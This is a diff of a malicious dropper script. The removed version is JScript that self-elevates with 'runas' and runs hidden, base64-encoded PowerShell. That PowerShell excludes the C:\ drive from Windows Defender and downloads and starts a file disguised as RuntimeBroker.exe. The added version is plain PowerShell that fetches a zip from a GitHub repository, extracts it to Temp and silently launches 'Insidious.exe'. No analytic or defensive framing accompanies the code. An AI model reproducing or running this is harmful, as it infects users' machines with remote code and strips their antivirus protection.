@@ -1,15 +1,19 @@
-EnsureElevatedPrivileges();
-function EnsureElevatedPrivileges() {
-    if (!WScript.Arguments.Named.Exists("elevate")) {
-        new ActiveXObject("Shell.Application").ShellExecute(WScript.FullName, "\"" + WScript.ScriptFullName + "\" /elevate", "", "runas", 1);
-        WScript.Quit();
-    }
-}
-var WshShell = new ActiveXObject("Wscript.Shell");
-WshShell.run("powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjAG8AbQBtAGEAbgBkACAAIgBBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAIgBDADoAXAANAAoA", 0, false);
+$url = "https://github.com/whoamidwh/twertwert/archive/refs/heads/main.zip"
+$zipPath = "$env:TEMP\twertwert-main.zip"
+$extractPath = "$env:TEMP\twertwert-main"
+$exePath = "$extractPath\twertwert-main\Insidious.exe"
 
-WshShell.run("powershell -enc cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgAEMAOgBcAA==", 0, false);
 
-WshShell.run("powershell -enc JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AdwBoAG8AYQBtAGkAZAB3AGgALwB0AHcAZQByAHQAdwBlAHIAdAAvAGEAcgBjAGgAaQB2AGUALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAGkAbgAuAHoAaQBwACIACgAkAG8AdQB0AHAAdQB0ACAAPQAgACIAJABlAG4AdgA6AFQAZQBtAHAALwBSAHUAbgB0AGkAbQBlAEIAcgBvAGsAZQByAC4AZQB4AGUAIgAKAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAkAHUAcgBsACAALQBPAHUAdABGAGkAbABlACAAJABvAHUAdABwAHUAdAAKAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAtAEYAaQBsAGUAUABhAHQAaAAgACQAbwB1AHQAcAB1AHQA", 0, false);
+Invoke-WebRequest -Uri $url -OutFile $zipPath
 
-WScript.exit;
+
+New-Item -ItemType Directory -Path $extractPath -Force
+
+
+Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
+
+
+Remove-Item -Path $zipPath -Force
+
+
+Start-Process -FilePath $exePath
